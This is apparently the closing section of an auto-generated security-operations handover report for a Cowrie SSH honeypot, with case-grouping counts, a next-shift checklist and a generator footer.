| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 34 priority case(s) shown individually · 22 recon entry/entries in table (15 group(s) consolidating 363 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-03T06:30:16Z_
